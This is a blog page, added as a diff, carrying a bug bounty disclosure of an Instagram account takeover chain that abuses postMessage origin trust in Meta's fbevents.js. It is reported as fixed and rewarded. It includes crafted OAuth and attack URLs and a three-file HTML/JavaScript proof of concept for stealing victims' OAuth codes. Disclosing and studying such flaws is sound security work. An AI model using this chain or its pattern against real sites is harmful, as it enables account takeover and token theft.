@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Instagram account takeover via Meta Pixel script abuse | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Instagram account takeover via Meta Pixel script abuse" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains." />
+<meta property="og:description" content="Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains." />
+<link rel="canonical" href="https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html" />
+<meta property="og:url" content="https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-16T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Instagram account takeover via Meta Pixel script abuse" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-01-16T00:00:00+02:00","datePublished":"2026-01-16T00:00:00+02:00","description":"Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains.","headline":"Instagram account takeover via Meta Pixel script abuse","mainEntityOfPage":{"@type":"WebPage","@id":"https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html"},"url":"https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://ysamm.com/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Instagram account takeover via Meta Pixel script abuse</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2026-01-16T00:00:00+02:00" itemprop="datePublished">Jan 16, 2026
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="introduction">Introduction</h1>
+<hr />
+<p><br />
+Meta’s web ecosystem relies on cross-window messaging between first-party websites.
+In many cases, the only security control enforced is an origin check validating that messages originate from <code class="language-plaintext highlighter-rouge">facebook.com</code> or its subdomains.</p>
+
+<p>This write-up describes how that assumption can be abused to steal first-party OAuth codes and generate first-party Instagram access tokens, ultimately enabling Instagram and Facebook account takeovers under realistic conditions.</p>
+
+<p>The attack leverages a chain between a misconfigured Facebook endpoint and implicit trust in postMessage listeners such as in <code class="language-plaintext highlighter-rouge">fbevents.js</code>, which is widely deployed across Meta-owned and third-party websites.</p>
+
+<h1 id="description">Description</h1>
+<hr />
+<h3 id="cross-window-trust-in-meta-javascript">Cross-Window Trust in Meta JavaScript</h3>
+
+<p>Multiple Meta JavaScript modules register cross-window message listeners and trust incoming messages solely based on <code class="language-plaintext highlighter-rouge">event.origin</code> being <code class="language-plaintext highlighter-rouge">facebook.com</code> or one of its subdomains.</p>
+
+<p>One such consumer is <code class="language-plaintext highlighter-rouge">fbevents.js</code>, the Meta Pixel script embedded on millions of websites.
+When loaded in a window that has an <code class="language-plaintext highlighter-rouge">opener</code>, <code class="language-plaintext highlighter-rouge">fbevents.js</code> registers a message listener and reacts to specific message types by issuing requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>, including contextual data such as the current website’s <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code>. These values would contain sensitive artifacts such as OAuth authorization codes or stokens.</p>
+
+<h3 id="abusing-facebookcomredacted-endpoint">Abusing facebook.com/REDACTED endpoint</h3>
+
+<p>The message source in this chain is the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/REDACTED</code></p>
+
+<p>This endpoint constructs an object from user-supplied parameters and forwards it via <code class="language-plaintext highlighter-rouge">postMessage</code> to a target Facebook domain specified by the attacker.</p>
+
+<h3 id="chaining-with-fbeventsjs">Chaining with fbevents.js</h3>
+
+<p>When <code class="language-plaintext highlighter-rouge">fbevents.js</code> receives a message originating from <code class="language-plaintext highlighter-rouge">facebook.com</code> and matching specific message types, it uses the supplied <code class="language-plaintext highlighter-rouge">access_token</code> in the message to issue requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>.</p>
+
+<p>Crucially, the attacker fully controls this <code class="language-plaintext highlighter-rouge">access_token</code>. Meaning by supplying an attacker-owned Graph Explorer token, the resulting requests can later be inspected in the Graph Explorer history, where leaked values such as the victim’s OAuth code/token in the URL or <code class="language-plaintext highlighter-rouge">referrer</code> become visible.</p>
+
+<h3 id="attack-scenario">Attack Scenario</h3>
+
+<p>The following scenario targets <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which loads <code class="language-plaintext highlighter-rouge">fbevents.js</code> and hosts multiple OAuth callback endpoints for Instagram and Threads.</p>
+
+<p>An example OAuth authorization request initiated by the attacker:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/authorize/third_party?
+<span class="err">&amp;</span>app_id=200289238967899
+<span class="err">&amp;</span>redirect_uri=https://developers.facebook.com/instagram/token_generator/oauth/
+<span class="err">&amp;</span>response_type=code
+<span class="err">&amp;</span>scope=user_profile,user_media
+<span class="err">&amp;</span>state={"app_id":"200289238967899","nonce":"WRONG_NONCE","user_id":"1"}
+</code></pre></div></div>
+<p>Using an invalid nonce causes the flow to land on an error page at <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which still loads <code class="language-plaintext highlighter-rouge">fbevents.js</code>.</p>
+
+<p>Because the window has an opener, <code class="language-plaintext highlighter-rouge">fbevents.js</code> initializes its message listener.</p>
+
+<p>At this point, the attacker redirects attacker website to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/REDACTED/?
+<span class="err">&amp;</span>graphToken=ATTACKER_EXPLORER_TOKEN
+<span class="err">&amp;</span>msg_type=FACEBOOK_IWL_BOOTSTRAP
+<span class="err">&amp;</span>pixelID=438056466377696
+<span class="err">&amp;</span>sessionStartTime=1668626372000
+</code></pre></div></div>
+
+<p>This causes <code class="language-plaintext highlighter-rouge">www.facebook.com</code> to send a crafted message to the <code class="language-plaintext highlighter-rouge">opener</code> (developers.facebook.com) window under a trusted origin. <code class="language-plaintext highlighter-rouge">fbevents.js</code> consumes the message and issues Graph API requests using the attacker-controlled token, embedding <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code> in these requests.</p>
+
+<p>By inspecting the attacker token’s history in Graph Explorer, the attacker can retrieve the Instagram OAuth authorization code and referrer data.</p>
+
+<h3 id="generating-a-first-party-instagram-access-token">Generating a First-Party Instagram Access Token</h3>
+
+<p>The stolen code can be exchanged for a first-party Instagram access token by abusing the following endpoint:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developers.facebook.com/instagram/short_lived_access_token/oauth/?
+<span class="err">&amp;</span>code=VICTIM_CODE
+<span class="err">&amp;</span>state={"app_id":"FIRST_PARTY_APP","nonce":"YOUR_NONCE","user_id":"1"}
+</code></pre></div></div>
+
+<p>This returns a first-party Instagram access token, even when the code was generated by a different application. This in itself was a critical bug however Meta refused to acknowledge it and then later fixed it in secret.</p>
+
+<h3 id="poc">PoC</h3>
+<p><strong>index.html:</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+Put your access_token in URL fragment and refresh (nothing is logged)
+<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"window.name='test';window.open('second.html' + location.hash)"</span><span class="nt">&gt;</span>Start Attack<span class="nt">&lt;/button&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p><strong>second.html</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">wait.html</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://www.instagram.com/oauth/authorize/third_party/?redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Finstagram%2Ftoken_generator%2Foauth%2F&amp;response_type=code&amp;scope=user_profile&amp;app_id=17951132926087090&amp;logger_id=02f8edcd-6353-454e-80c3-ec5c4e496bd2&amp;state={"app_id":1,"nonce":"somethingwrong"}</span><span class="dl">'</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p><strong>wait.html</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="k">try</span><span class="p">{</span>
+    <span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+    <span class="nx">opener</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">ping</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/REDACTED/?graphToken=</span><span class="p">${</span><span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">||</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">))}</span><span class="s2">&amp;msg_type=FACEBOOK_IWL_BOOTSTRAP&amp;pixelID=438056466377696&amp;sessionStartTime=1668626372000&amp;`</span><span class="p">}</span>
+    <span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span><span class="p">{}</span>
+<span class="p">},</span><span class="mi">100</span><span class="p">)</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h1 id="impact">Impact</h1>
+<hr />
+<p><br />
+This vulnerability enables theft of first-party Instagram OAuth codes, generation of first-party access tokens, Instagram account takeover.</p>
+
+<p>Because fbevents.js is widely deployed, the attack surface extends beyond Meta properties to third-party websites.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 16, 2024 — Bug reported</p>
+
+<p>Oct 16, 2024 — Bug Acknowledged by Meta</p>
+
+<p>Oct 24, 2024 — Bug fixed by Meta</p>
+
+<p>Feb 12, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>
+
+  </div><a class="u-url" href="/uncategorized/2026/01/16/leaking-fbevents-ato.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li><li><a class="u-email" href="mailto:ysamm@proton.me">ysamm@proton.me</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
